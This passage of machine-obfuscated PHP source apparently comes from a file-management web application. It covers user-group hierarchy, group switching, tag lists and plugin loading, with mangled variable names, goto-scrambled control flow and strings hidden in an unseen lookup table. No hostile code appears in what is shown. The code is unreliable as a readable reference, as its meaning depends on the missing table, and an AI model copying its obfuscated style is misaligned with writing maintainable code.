($GLOBALS[$F¢ø¢İô²Ö[508]] == $F¢ø¢İô²Ö[97]) { $cìÁ£ï‘¯Æ = !1; } foreach ($E™Œ°ãã‹í as &$DÀ“”á›™) { $a É±Ø³êˆ = $this->parentLevelArray($DÀ“”á›™[$F¢ø¢İô²Ö[524]]); $d¿©µÏŒ’ = $F¢ø¢İô²Ö[43]; foreach ($a É±Ø³êˆ as $bî³ø÷Åàä => $b¥‹¹ÔÌª°) { if ($cìÁ£ï‘¯Æ && $bî³ø÷Åàä == 0) { continue; } $d¿©µÏŒ’ .= $fŒ¬†¡ˆèÔ[$b¥‹¹ÔÌª°] . $F¢ø¢İô²Ö[8]; } if ($a É±Ø³êˆ) { $d¿©µÏŒ’ .= $DÀ“”á›™[$F¢ø¢İô²Ö[38]]; } $DÀ“”á›™[$F¢ø¢İô²Ö[529]] = str_replace($F¢ø¢İô²Ö[532], $F¢ø¢İô²Ö[8], $d¿©µÏŒ’); } unset($DÀ“”á›™); goto Dõá³‘¬Á‹; D´î‘Œ‚Ä£: unset($DÀ“”á›™); foreach ($fŒ¬†¡ˆèÔ as $bî³ø÷Åàä => $BîÜµñÄ§”) { if ($BîÜµñÄ§”) { continue; } $bóä©­Ôù = $this->getInfoSimple($bî³ø÷Åàä); $fŒ¬†¡ˆèÔ[$bî³ø÷Åàä] = $bóä©­Ôù[$F¢ø¢İô²Ö[38]]; } $cìÁ£ï‘¯Æ = $GLOBALS[$F¢ø¢İô²Ö[6]][$F¢ø¢İô²Ö[98]][$F¢ø¢İô²Ö[1817]]; goto C¡”æèâİ; Dµ¸¤ç—éæ: $F¢ø¢İô²Ö =& $_SERVER[œÕÊİğö]; $fŒ¬†¡ˆèÔ = array(); foreach ($E™Œ°ãã‹í as &$DÀ“”á›™) { $fŒ¬†¡ˆèÔ[$DÀ“”á›™[$F¢ø¢İô²Ö[1720]]] = $DÀ“”á›™[$F¢ø¢İô²Ö[38]]; $a É±Ø³êˆ = $this->parentLevelArray($DÀ“”á›™[$F¢ø¢İô²Ö[524]]); foreach ($a É±Ø³êˆ as $b¥‹¹ÔÌª°) { if (!isset($fŒ¬†¡ˆèÔ[$b¥‹¹ÔÌª°])) { $fŒ¬†¡ˆèÔ[$b¥‹¹ÔÌª°] = 0; } } } goto D´î‘Œ‚Ä£; Dõá³‘¬Á‹: } private function _listAppendSourceRoot(&$d¥¢İÁõå, $B– †Ïéƒï) { goto F‰—†¬Ïù; F‰—†¬Ïù: $B×ÇÔÆæµ› =& $_SERVER[œÕÊİğö]; $EäæÜùÊºÅ = array($B×ÇÔÆæµ›[501] => 0, $B×ÇÔÆæµ›[507] => array($B×ÇÔÆæµ›[7], $B– †Ïéƒï), $B×ÇÔÆæµ›[415] => SourceModel::TYPE_GROUP); $f«§Öœ¦Úù = Model($B×ÇÔÆæµ›[822])->order($B×ÇÔÆæµ›[1818])->field($B×ÇÔÆæµ›[1819]); goto B¢…®Í°Šò; fÃÚÉ×¶”: foreach ($d¥¢İÁõå as &$Bô‚ÄØ”ˆ) { $Bô‚ÄØ”ˆ[$B×ÇÔÆæµ›[95]] = $DÇ„¬Şê¾ò[$Bô‚ÄØ”ˆ[$B×ÇÔÆæµ›[1720]]] ? $DÇ„¬Şê¾ò[$Bô‚ÄØ”ˆ[$B×ÇÔÆæµ›[1720]]] : array(); } unset($Bô‚ÄØ”ˆ); goto AÉÆõ·óÙæ; B¢…®Í°Šò: $DÇ„¬Şê¾ò = $f«§Öœ¦Úù->limit(count($B– †Ïéƒï))->where($EäæÜùÊºÅ)->select(); $DÇ„¬Şê¾ò = array_to_keyvalue($DÇ„¬Şê¾ò, $B×ÇÔÆæµ›[507]); $DÇ„¬Şê¾ò = array_remove_key($DÇ„¬Şê¾ò, $B×ÇÔÆæµ›[507]); goto fÃÚÉ×¶”; AÉÆõ·óÙæ: } protected function groupMerge($aø›°¹¦Ú) { $aø›°¹¦Ú = array_values(array_unique($aø›°¹¦Ú)); $e‰â«’ô = array(); for ($FÓ¿ÀäÁ®Ğ = 0; $FÓ¿ÀäÁ®Ğ < count($aø›°¹¦Ú); $FÓ¿ÀäÁ®Ğ++) { $cÕÖÃîÌÃ° = !1; for ($bˆò»‚ËÃã = 0; $bˆò»‚ËÃã < count($aø›°¹¦Ú); $bˆò»‚ËÃã++) { if ($FÓ¿ÀäÁ®Ğ == $bˆò»‚ËÃã) { continue; } if ($this->isParentOf($aø›°¹¦Ú[$bˆò»‚ËÃã], $aø›°¹¦Ú[$FÓ¿ÀäÁ®Ğ])) { $cÕÖÃîÌÃ° = !0; break; } } if (!$cÕÖÃîÌÃ°) { $e‰â«’ô[] = $aø›°¹¦Ú[$FÓ¿ÀäÁ®Ğ]; } } return $e‰â«’ô; } protected function isParentOf($b©¸¦â•é, $aÑÛ‘°Ÿ¸İ) { goto dÚÏ®½¬Ç‚; dÚÏ®½¬Ç‚: $bŒšÍÆ‡ÂÀ =& $_SERVER[œÕÊİğö]; if (!$b©¸¦â•é || !$aÑÛ‘°Ÿ¸İ || $b©¸¦â•é == $aÑÛ‘°Ÿ¸İ) { return !1; } $C„Ê‹œÁã¾ = $this->getInfoSimple($b©¸¦â•é); goto AÇ²ğçæî‡; EœãœË¯: return !1; goto bÊ÷âÕ ³; AÇ²ğçæî‡: $B‘ÑÂ…ŸŞ’ = $this->getInfoSimple($aÑÛ‘°Ÿ¸İ); $Aˆ˜¹«¦”Ë = $C„Ê‹œÁã¾[$bŒšÍÆ‡ÂÀ[524]] . $b©¸¦â•é . $bŒšÍÆ‡ÂÀ[57]; if (substr($B‘ÑÂ…ŸŞ’[$bŒšÍÆ‡ÂÀ[524]], 0, strlen($Aˆ˜¹«¦”Ë)) == $Aˆ˜¹«¦”Ë) { return !0; } goto EœãœË¯; bÊ÷âÕ ³: } public function groupShowRoot($Aˆª¡Í¥, $e›Œ‡Õ™Ê = false) { goto cÆÉÅ¾·¼ã; cÆÉÅ¾·¼ã: $Cğ±Í¢Ä¯ô =& $_SERVER[œÕÊİğö]; $FÅŞ‚óµÍ½ = $this->getInfo($Aˆª¡Í¥); if (!$FÅŞ‚óµÍ½) { return array(); } goto DÌôÒ¬ë£; d¹ğ‡ôÄ: if ($e›Œ‡Õ™Ê && count($E„Óõ¡¾) == 1) { return $a‰ôŒÙ¶÷Û; } if (!$FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[468]] || !isset($FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[468]][$Cğ±Í¢Ä¯ô[1802]]) || $FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[468]][$Cğ±Í¢Ä¯ô[1802]] == $Cğ±Í¢Ä¯ô[1774]) { return $this->groupShowRoot($E„Óõ¡¾[count($E„Óõ¡¾) - 1], $e›Œ‡Õ™Ê); } if ($FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[468]][$Cğ±Í¢Ä¯ô[1802]] == $Cğ±Í¢Ä¯ô[365]) { $aÅåÛÚÍ‹Ø = explode($Cğ±Í¢Ä¯ô[57], $FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[468]][$Cğ±Í¢Ä¯ô[1803]]); if ($aÅåÛÚÍ‹Ø) { $a‰ôŒÙ¶÷Û = array_merge($a‰ôŒÙ¶÷Û, $aÅåÛÚÍ‹Ø); } } goto b©»¦îŠÃ; b©»¦îŠÃ: return $a‰ôŒÙ¶÷Û; goto C¾¤‹¼«õ; DÌôÒ¬ë£: $E„Óõ¡¾ = $this->parentLevelArray($FÅŞ‚óµÍ½[$Cğ±Í¢Ä¯ô[524]]); $a‰ôŒÙ¶÷Û = array($Aˆª¡Í¥); if (count($E„Óõ¡¾) == 0) { return $a‰ôŒÙ¶÷Û; } goto d¹ğ‡ôÄ; C¾¤‹¼«õ: } protected function resetParentLevel() { $d—ø­±˜³õ =& $_SERVER[œÕÊİğö]; $F¿Ñ†ö´Òã = $d—ø­±˜³õ[1720]; $e†Â”Ú‰™İ = $this->select(); $e†Â”Ú‰™İ = array_to_keyvalue($e†Â”Ú‰™İ, $F¿Ñ†ö´Òã); foreach ($e†Â”Ú‰™İ as $B¤ËâÇÛ×Ï) { goto BÉ‘Ùò‡©ó; cšêÜªª¥: $this->where(array($F¿Ñ†ö´Òã => $B¤ËâÇÛ×Ï[$F¿Ñ†ö´Òã]))->save(array($d—ø­±˜³õ[587] => $FÛáÁµÄ°)); goto Cå„ßù¯; c²Û¢Æ˜Üì: $FÛáÁµÄ°[] = 0; $FÛáÁµÄ° = $d—ø­±˜³õ[57] . implode($d—ø­±˜³õ[57], array_reverse($FÛáÁµÄ°)) . $d—ø­±˜³õ[57]; $this->setNamePinyin($B¤ËâÇÛ×Ï[$F¿Ñ†ö´Òã], $B¤ËâÇÛ×Ï[$d—ø­±˜³õ[38]]); goto cšêÜªª¥; BÉ‘Ùò‡©ó: $f‡ÅÙ¤£Úó = $B¤ËâÇÛ×Ï; $FÛáÁµÄ° = array(); while ($f‡ÅÙ¤£Úó[$d—ø­±˜³õ[501]] != 0) { $FÛáÁµÄ°[] = $f‡ÅÙ¤£Úó[$d—ø­±˜³õ[501]]; $f‡ÅÙ¤£Úó = $e†Â”Ú‰™İ[$f‡ÅÙ¤£Úó[$d—ø­±˜³õ[501]]]; } goto c²Û¢Æ˜Üì; Cå„ßù¯: } return $e†Â”Ú‰™İ; } public function groupNameAuto($fßÈáñ¤Òù, $A½™ÔĞŠƒ) { $D±¿šÙ¤õÃ =& $_SERVER[œÕÊİğö]; $cùß•ÛÚ‘ = $this->where(array($D±¿šÙ¤õÃ[405] => $fßÈáñ¤Òù))->getField($D±¿šÙ¤õÃ[38], !0); if (!$cùß•ÛÚ‘ || !in_array($A½™ÔĞŠƒ, $cùß•ÛÚ‘)) { return $A½™ÔĞŠƒ; } for ($eÜ¾†çÂ÷± = 1; $eÜ¾†çÂ÷± <= count($cùß•ÛÚ‘) + 1; $eÜ¾†çÂ÷±++) { $b®˜ÔÃÏœ« = $A½™ÔĞŠƒ . "\x28{$eÜ¾†çÂ÷±}\x29"; if (!in_array($b®˜ÔÃÏœ«, $cùß•ÛÚ‘)) { return $b®˜ÔÃÏœ«; } } } public function groupSwitch($bÂ¨ä¶¯, $CÃù‡ÉÏò) { goto Dªç‘ì‘Ø†; C¢ŞĞçœ’: $E®¡¿öÎÎ = !empty($dğšµÍ¸Ò×[$bÂ¨ä¶¯]) ? $dğšµÍ¸Ò×[$bÂ¨ä¶¯] : !1; if ($E®¡¿öÎÎ) { goto aá›®çÅ´ö; Fğã†‚˜õ: $dğšµÍ¸Ò× = Model($EŠ¥†Å¾ÕÛ[822])->where($f•“í¯•“)->field($EŠ¥†Å¾ÕÛ[1822])->select(); if (!$dğšµÍ¸Ò×) { $dğšµÍ¸Ò× = array(); } Model($EŠ¥†Å¾ÕÛ[822])->moveClearAuth = !1; goto B‹Î¬–•ÜŒ; Eõñ´‘î: $FæÑğº…Ù» = array($EŠ¥†Å¾ÕÛ[507] => $CÃù‡ÉÏò); Model($EŠ¥†Å¾ÕÛ[1823])->where($f•“í¯•“)->save($FæÑğº…Ù»); Model($EŠ¥†Å¾ÕÛ[1824])->where($f•“í¯•“)->save($FæÑğº…Ù»); goto C¿ãÒ½†á; aá›®çÅ´ö: if (!$dğšµÍ¸Ò×[$CÃù‡ÉÏò]) { $dğšµÍ¸Ò×[$CÃù‡ÉÏò] = Model($EŠ¥†Å¾ÕÛ[822])->groupRootAdd($CÃù‡ÉÏò); } $f‰‚íğ”† = $dğšµÍ¸Ò×[$CÃù‡ÉÏò]; $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[501] => $E®¡¿öÎÎ); goto Fğã†‚˜õ; B‹Î¬–•ÜŒ: foreach ($dğšµÍ¸Ò× as $dÚƒñŠïßÚ) { $dï§ƒä·„Æ = $dÚƒñŠïßÚ[$EŠ¥†Å¾ÕÛ[414]] == $EŠ¥†Å¾ÕÛ[97] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($EŠ¥†Å¾ÕÛ[822])->move($dÚƒñŠïßÚ[$EŠ¥†Å¾ÕÛ[406]], $f‰‚íğ”†, $dï§ƒä·„Æ); } Model($EŠ¥†Å¾ÕÛ[822])->moveClearAuth = !0; $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[415] => 2, $EŠ¥†Å¾ÕÛ[507] => $bÂ¨ä¶¯); goto Eõñ´‘î; C¿ãÒ½†á: } $this->_changeChildLevel($B‰¨·æ¹ƒá[$bÂ¨ä¶¯], $B‰¨·æ¹ƒá[$CÃù‡ÉÏò], !0); goto C»¡İÅ‘¥; B‘åİçĞªÓ: $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[415] => 2, $EŠ¥†Å¾ÕÛ[501] => 0, $EŠ¥†Å¾ÕÛ[414] => 1, $EŠ¥†Å¾ÕÛ[507] => array($EŠ¥†Å¾ÕÛ[7], array($bÂ¨ä¶¯, $CÃù‡ÉÏò))); $dğšµÍ¸Ò× = Model($EŠ¥†Å¾ÕÛ[822])->where($f•“í¯•“)->field($EŠ¥†Å¾ÕÛ[1821])->select(); $dğšµÍ¸Ò× = array_to_keyvalue($dğšµÍ¸Ò×, $EŠ¥†Å¾ÕÛ[507], $EŠ¥†Å¾ÕÛ[406]); goto C¢ŞĞçœ’; C»¡İÅ‘¥: $this->where(array($EŠ¥†Å¾ÕÛ[501] => $bÂ¨ä¶¯))->save(array($EŠ¥†Å¾ÕÛ[501] => $CÃù‡ÉÏò)); $this->_clearChildrenCache($B‰¨·æ¹ƒá[$CÃù‡ÉÏò]); return !0; goto eÂ„Ô¹»âƒ; Dªç‘ì‘Ø†: $EŠ¥†Å¾ÕÛ =& $_SERVER[œÕÊİğö]; $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[1720] => array($EŠ¥†Å¾ÕÛ[7], array($bÂ¨ä¶¯, $CÃù‡ÉÏò))); $B‰¨·æ¹ƒá = $this->where($f•“í¯•“)->select(); goto E™óÔƒó„; A¯”Œ¥“ˆ: $aËƒ¡ºÌ¬ğ = Model($EŠ¥†Å¾ÕÛ[1806])->where($f•“í¯•“)->select(); if (!$aËƒ¡ºÌ¬ğ) { $aËƒ¡ºÌ¬ğ = array(); } foreach ($aËƒ¡ºÌ¬ğ as $bˆöÓ›•¶’) { $Cİ÷š”Ø˜¯ = $bˆöÓ›•¶’[$EŠ¥†Å¾ÕÛ[1551]]; $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[1551] => $Cİ÷š”Ø˜¯, $EŠ¥†Å¾ÕÛ[1720] => $CÃù‡ÉÏò); $EÅµÔ¼¤ËŒ = Model($EŠ¥†Å¾ÕÛ[1806])->where($f•“í¯•“)->find(); if (!$EÅµÔ¼¤ËŒ) { $FØà”Œ‡¥÷ = array($CÃù‡ÉÏò => $bˆöÓ›•¶’[$EŠ¥†Å¾ÕÛ[1820]]); Model($EŠ¥†Å¾ÕÛ[541])->userGroupAdd($Cİ÷š”Ø˜¯, $FØà”Œ‡¥÷); } Model($EŠ¥†Å¾ÕÛ[541])->userGroupRemove($Cİ÷š”Ø˜¯, $bÂ¨ä¶¯); } goto B‘åİçĞªÓ; E™óÔƒó„: $B‰¨·æ¹ƒá = array_to_keyvalue($B‰¨·æ¹ƒá, $EŠ¥†Å¾ÕÛ[1720]); if (!isset($B‰¨·æ¹ƒá[$bÂ¨ä¶¯]) || !isset($B‰¨·æ¹ƒá[$CÃù‡ÉÏò]) || $B‰¨·æ¹ƒá[$bÂ¨ä¶¯][$EŠ¥†Å¾ÕÛ[501]] == 0) { return !1; } $f•“í¯•“ = array($EŠ¥†Å¾ÕÛ[1720] => $bÂ¨ä¶¯); goto A¯”Œ¥“ˆ; eÂ„Ô¹»âƒ: } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\137\x66\141\x76"; protected function cacheFunctionAlias($B¨Ó«‹¤ÁÊ) { $A«ÇÇÙé½À =& $_SERVER[œÕÊİğö]; return array($A«ÇÇÙé½À[1825] => array($B¨Ó«‹¤ÁÊ[0], $A«ÇÇÙé½À[1826]), $A«ÇÇÙé½À[1827] => array($B¨Ó«‹¤ÁÊ[0], $A«ÇÇÙé½À[1828])); } protected function get($aÁÇÈİ¥æ) { $eà•¥ØÀŸŸ =& $_SERVER[œÕÊİğö]; $BÏ–Ñºë = Model($eà•¥ØÀŸŸ[525])->metaGet($aÁÇÈİ¥æ, $eà•¥ØÀŸŸ[1829]); $D®’Ëº±³· = json_decode($BÏ–Ñºë, !0); return $D®’Ëº±³· ? $D®’Ëº±³· : array($eà•¥ØÀŸŸ[1830] => $eà•¥ØÀŸŸ[97], $eà•¥ØÀŸŸ[377] => array()); } protected function set($F®Í”¦µ‚, $E¦Ğ¸óÈÒ) { $Fà£ñºâå„ =& $_SERVER[œÕÊİğö]; $E¦Ğ¸óÈÒ = $E¦Ğ¸óÈÒ ? $E¦Ğ¸óÈÒ : array($Fà£ñºâå„[1830] => $Fà£ñºâå„[97], $Fà£ñºâå„[377] => array()); Model($Fà£ñºâå„[525])->metaSet($F®Í”¦µ‚, $Fà£ñºâå„[1829], json_encode($E¦Ğ¸óÈÒ)); return Model($Fà£ñºâå„[525])->metaSet($F®Í”¦µ‚, $Fà£ñºâå„[1829], json_encode($E¦Ğ¸óÈÒ)); } protected function getByTagID($AßŸ˜ÈÔİö, $BÙÒºñø¯¡) { goto CÌéÙİ¬; eé‡éÛà : return is_array($Dî¼ˆ±Ú÷) ? $Dî¼ˆ±Ú÷ : !1; goto dí‚Åñì«”; aé†´ÃÁêÇ: $AİÇ†œ¢†’ = $this->get($AßŸ˜ÈÔİö); if (!$AİÇ†œ¢†’ || !isset($AİÇ†œ¢†’[$d—Êææ‘Ëª[377]])) { return !1; } $Dî¼ˆ±Ú÷ = array_find_by_field($AİÇ†œ¢†’[$d—Êææ‘Ëª[377]], $d—Êææ‘Ëª[404], $BÙÒºñø¯¡); goto eé‡éÛà ; CÌéÙİ¬: $d—Êææ‘Ëª =& $_SERVER[œÕÊİğö]; if (!$AßŸ˜ÈÔİö || !$BÙÒºñø¯¡) { return !1; } if (!Model($d—Êææ‘Ëª[525])->getInfoSimple($AßŸ˜ÈÔİö)) { return !1; } goto aé†´ÃÁêÇ; dí‚Åñì«”: } public function listSource($bÄæ¶¤¤Û™, $f¥—ŸîÕƒÚ) { goto a¨Ê´Š°È´; c»î…³¹½: foreach ($C‡ÃÏ³Ìå— as $fé¸´¹’Üƒ => $e·Ìµ…šà‹) { $F¿¿ó¤‰´ó = !0; if (!$f¥—ŸîÕƒÚ) { $cöÑÏÕ´¢ø[] = $fé¸´¹’Üƒ; continue; } foreach ($f¥—ŸîÕƒÚ as $d¥öÉ®ÊÄ) { if (!in_array($d¥öÉ®ÊÄ, $e·Ìµ…šà‹)) { $F¿¿ó¤‰´ó = !1; break; } } if ($F¿¿ó¤‰´ó) { $cöÑÏÕ´¢ø[] = $fé¸´¹’Üƒ; } } if (!$cöÑÏÕ´¢ø) { return array(); } $Aò—©‰ÓåÄ = array($cÖã« ¨è¶[421] => array($cÖã« ¨è¶[422], $cöÑÏÕ´¢ø), $cÖã« ¨è¶[507] => $bÄæ¶¤¤Û™, $cÖã« ¨è¶[415] => SourceModel::TYPE_GROUP); goto b“Œ¦÷Æ —; E˜õÓÙ–‘ù: foreach ($cöÑÏÕ´¢ø as $e­İ³ã—„İ) { if (!in_array($e­İ³ã—„İ, $A·Ô™¹±Şˆ)) { $F¬„÷™ëÁ–[] = $e­İ³ã—„İ; } } if ($F¬„÷™ëÁ–) { $this->removeBySource($bÄæ¶¤¤Û™, $F¬„÷™ëÁ–); } return $fñ÷İ¾©‚¼; goto C ©â¶Ì†Î; b“Œ¦÷Æ —: $fñ÷İ¾©‚¼ = Model($cÖã« ¨è¶[1228])->listSource($Aò—©‰ÓåÄ); if (!$fñ÷İ¾©‚¼ || count($cöÑÏÕ´¢ø) == $fñ÷İ¾©‚¼[$cÖã« ¨è¶[374]][$cÖã« ¨è¶[375]]) { return $fñ÷İ¾©‚¼; } $F¬„÷™ëÁ– = array(); goto aÒÚŒçÇˆ; aÒÚŒçÇˆ: $C°ô¡óÎõœ = array_to_keyvalue($fñ÷İ¾©‚¼[$cÖã« ¨è¶[85]], $cÖã« ¨è¶[43], $cÖã« ¨è¶[406]); $cŞ³•âÄ° = array_to_keyvalue($fñ÷İ¾©‚¼[$cÖã« ¨è¶[84]], $cÖã« ¨è¶[43], $cÖã« ¨è¶[406]); $A·Ô™¹±Şˆ = array_merge($cŞ³•âÄ°, $C°ô¡óÎõœ); goto E˜õÓÙ–‘ù; c»Ò‚¹µÂ: $C‡ÃÏ³Ìå— = array(); foreach ($cŒ…Êö£™­ as $e£¤ã«Í™) { $e­İ³ã—„İ = $e£¤ã«Í™[$cÖã« ¨è¶[86]]; if (!$e­İ³ã—„İ) { continue; } if (!isset($C‡ÃÏ³Ìå—[$e­İ³ã—„İ])) { $C‡ÃÏ³Ìå—[$e­İ³ã—„İ] = array(); } $C‡ÃÏ³Ìå—[$e­İ³ã—„İ][] = $e£¤ã«Í™[$cÖã« ¨è¶[430]]; } $cöÑÏÕ´¢ø = array(); goto c»î…³¹½; a¨Ê´Š°È´: $cÖã« ¨è¶ =& $_SERVER[œÕÊİğö]; if ($f¥—ŸîÕƒÚ && !is_array($f¥—ŸîÕƒÚ)) { $f¥—ŸîÕƒÚ = array($f¥—ŸîÕƒÚ); } $cŒ…Êö£™­ = $this->listData($bÄæ¶¤¤Û™); goto c»Ò‚¹µÂ; C ©â¶Ì†Î: } protected function listData($a´ËÔÛ÷é†) { $aˆß×ÏÊ»° =& $_SERVER[œÕÊİğö]; $CÎŸ²ÒÒ¶ = array($aˆß×ÏÊ»°[1542] => 0, $aˆß×ÏÊ»°[486] => array($aˆß×ÏÊ»°[1831], 0), $aˆß×ÏÊ»°[426] => $aˆß×ÏÊ»°[1832] . $a´ËÔÛ÷é†); $DáòÇÇÔâÍ = $aˆß×ÏÊ»°[1833]; $B­Î•ìÃÖ = $this->field($DáòÇÇÔâÍ)->where($CÎŸ²ÒÒ¶)->order($aˆß×ÏÊ»°[1834])->select(); return $B­Î•ìÃÖ ? $B­Î•ìÃÖ : array(); } protected function addToTag($cØçê‘‰Ñ¬, $EÔÕ¾»©Ù, $c©Çœ¯İÂ) { $aŸçÄù‚¯ =& $_SERVER[œÕÊİğö]; if (!$this->getByTagID($cØçê‘‰Ñ¬, $c©Çœ¯İÂ) || !$EÔÕ¾»©Ù) { return !1; } if (!Model($aŸçÄù‚¯[822])->pathInfo($EÔÕ¾»©Ù)) { return !1; } $dáÌ¥ã´” = array($aŸçÄù‚¯[1542] => 0, $aŸçÄù‚¯[486] => $c©Çœ¯İÂ, $aŸçÄù‚¯[425] => $EÔÕ¾»©Ù, $aŸçÄù‚¯[426] => $aŸçÄù‚¯[1835] . $cØçê‘‰Ñ¬, $aŸçÄù‚¯[424] => $aŸçÄù‚¯[43], $aŸçÄù‚¯[1724] => 0); if ($this->where($dáÌ¥ã´”)->find()) { return !1; } return $this->add($dáÌ¥ã´”); } protected function removeFromTag($böŞÇÄ×¤î, $Fªø· Î, $C‰‹˜Ìõæ”) { $a ”¯¼¢ëÅ =& $_SERVER[œÕÊİğö]; if (!$this->getByTagID($böŞÇÄ×¤î, $C‰‹˜Ìõæ”) || !$Fªø· Î) { return !1; } if (is_array($Fªø· Î)) { $Fªø· Î = array($a ”¯¼¢ëÅ[7], $Fªø· Î); } $c¥³¤Ş“‘‚ = array($a ”¯¼¢ëÅ[1542] => 0, $a ”¯¼¢ëÅ[486] => $C‰‹˜Ìõæ”, $a ”¯¼¢ëÅ[426] => $a ”¯¼¢ëÅ[1835] . $böŞÇÄ×¤î, $a ”¯¼¢ëÅ[425] => $Fªø· Î); return $this->where($c¥³¤Ş“‘‚)->delete(); } protected function removeByTag($E‡Õ„Îàó, $b¬—ÇèÇÇİ) { $EÔİ³¯ñÛ“ =& $_SERVER[œÕÊİğö]; if (!$this->getByTagID($E‡Õ„Îàó, $b¬—ÇèÇÇİ)) { return !1; } $A°¤‹éœˆÁ = array($EÔİ³¯ñÛ“[1542] => 0, $EÔİ³¯ñÛ“[486] => $b¬—ÇèÇÇİ, $EÔİ³¯ñÛ“[426] => $EÔİ³¯ñÛ“[1835] . $E‡Õ„Îàó); return $this->where($A°¤‹éœˆÁ)->delete(); } protected function removeBySource($bøµ®Ç÷Òà, $EÎôë¸÷) { $bµÇÙäï =& $_SERVER[œÕÊİğö]; if (!$bøµ®Ç÷Òà || !$EÎôë¸÷) { return !1; } if (is_array($EÎôë¸÷)) { $EÎôë¸÷ = array($bµÇÙäï[7], $EÎôë¸÷); } $d‰ˆÜÙ–” = array($bµÇÙäï[1542] => 0, $bµÇÙäï[425] => $EÎôë¸÷, $bµÇÙäï[486] => array($bµÇÙäï[995], 0), $bµÇÙäï[426] => $bµÇÙäï[1835] . $bøµ®Ç÷Òà); return $this->where($d‰ˆÜÙ–”)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\x70\x6c\x75\x67\151\156\114\151\x73\164"; public $field = array("\156\141\155\145", "\163\164\141\x74\x75\x73", "\162\x65\x67\151\x65\163\164", "\143\x6f\156\146\151\x67"); public function loadList($F¡ŸÂ‡Á‹î = false) { $Dñƒß†ğñ³ = array_to_keyvalue($this->listData(), $_SERVER[œÕÊİğö][38]); if ($F¡ŸÂ‡Á‹î) { return $Dñƒß†ğñ³[$F¡ŸÂ‡Á‹î]; } return $Dñƒß†ğñ³; } public function init() { $FĞ¾Õó£Ñ´ =& $_SERVER[œÕÊİğö]; Hook::trigger($FĞ¾Õó£Ñ´[1836]); $fñ¿˜ìŞ¬Ï = $this->loadPluginList(); foreach ($fñ¿˜ìŞ¬Ï as $E„ëÄ½ç§Ç => $Dµ÷çÏÚÆÃ) { $e˜Í–»Úí = $this->appAllow($E„ëÄ½ç§Ç, $Dµ÷çÏÚÆÃ); if (!$e˜Í–»Úí) { continue; } foreach ($Dµ÷çÏÚÆÃ[$FĞ¾Õó£Ñ´[1837]] as $aŸ ³ã‘£¦ => $AöÖßØ¦œ¤) { Hook::bind($aŸ ³ã‘£¦, $AöÖßØ¦œ¤); } } Hook::trigger($FĞ¾Õó£Ñ´[1838]); Hook::trigger(ACTION); } public function appAllow($Bìñøğí¨, $fÄĞï“êŸÍ, $Dä¤ãŞ•Ì = true) { $e‹¹¿»²à =& $_SERVER[œÕÊİğö]; $då«Âï¼Ò = PLUGIN_DIR . $Bìñøğí¨ . $e‹¹¿»²à[1839]; if (!is_array($fÄĞï“êŸÍ) || !is_array($fÄĞï“êŸÍ[$e‹¹¿»²à[1837]]) || $fÄĞï“êŸÍ[$e‹¹¿»²à[740]] != 1 || !is_file($då«Âï¼Ò)) { return !1; } if ($GLOBALS[$e‹¹¿»²à[508]] == 1) { return !0; } if ($Dä¤ãŞ•Ì && !Action($e‹¹¿»²à[1840])->checkAuth($Bìñøğí¨)) { return !1; } return !0; } public function unInstall($A¥ÕŒ¬ĞÈ) { $aƒéÂ´å¨ =& $_SERVER[œÕÊİğö]; $dø‚ƒåö¼ó = $this->loadList($A¥ÕŒ¬ĞÈ); if (file_exists(PLUGIN_DIR . $A¥ÕŒ¬ĞÈ)) { Hook::apply($A¥ÕŒ¬ĞÈ . $aƒéÂ´å¨[1841]); } $this->remove($dø‚ƒåö¼ó[$aƒéÂ´å¨[404]]); } public function changeStatus($dŞ±¨ÓÇÑ·, $e¢äß½é) { $f‹ƒ»õ˜µé =& $_SERVER[œÕÊİğö]; $C®º‚šŠò• = $this->loadList($dŞ±¨ÓÇÑ·); if ($e¢äß½é) { Hook::apply($dŞ±¨ÓÇÑ· . $f‹ƒ»õ˜µé[1842]); } $this->update($C®º‚šŠò•[$f‹ƒ»õ˜µé[404]], array($f‹ƒ»õ˜µé[1843] => $e¢äß½é)); } public function appRegist($eÊ‰ÃùğÀ¿, $aõ¶…ñË) { $BáÉµáõ²… =& $_SERVER[œÕÊİğö]; $fÏ‡ÙªËË = $this->loadList($eÊ‰ÃùğÀ¿); if ($fÏ‡ÙªËË) { $this->update($fÏ‡ÙªËË[$BáÉµáõ²…[404]], array($BáÉµáõ²…[1837] => $aõ¶…ñË)); } else { $dˆáğ¢åÕ = array($BáÉµáõ²…[38] => $eÊ‰ÃùğÀ¿, $BáÉµáõ²…[1837] => $aõ¶…ñË, $BáÉµáõ²…[740] => 0, $BáÉµáõ²…[6] => $this->getConfigDefault($eÊ‰ÃùğÀ¿)); $this->insert($dˆáğ¢åÕ); } } public function getConfigDefault($EµáöŠƒòÖ) { $d²×˜ØƒÓ =& $_SERVER[œÕÊİğö]; $fÒÂ¾‡ÜÃ = array(); $BÊÜÄŒÑ‡º = $this->getPackageJson($EµáöŠƒòÖ); if (!$BÊÜÄŒÑ‡º && is_array($BÊÜÄŒÑ‡º[$d²×˜ØƒÓ[1844]])) { return $fÒÂ¾‡ÜÃ; } foreach ($BÊÜÄŒÑ‡º[$d²×˜ØƒÓ[1844]] as $cœõÓèƒğ => $aŸßï¸§Ù¡) { if (!isset($aŸßï¸§Ù¡[$d²×˜ØƒÓ[382]]) || isset($fÒÂ¾‡ÜÃ[$cœõÓèƒğ])) { continue; } $fÒÂ¾‡ÜÃ[$cœõÓèƒğ] = $aŸßï¸§Ù¡[$d²×˜ØƒÓ[382]]; } return $fÒÂ¾‡ÜÃ; } public function getPackageJson($B’Ş“ªÎ¥) { return Hook::apply($B’Ş“ªÎ¥ . $_SERVER[œÕÊİğö][1845]); } public function getConfig($f¡¥™’ç³, $c¦æî˜ÀÏ = false) { $F¸ÏåñõÎ =& $_SERVER[œÕÊİğö]; $B­—²½«Ç = array(); 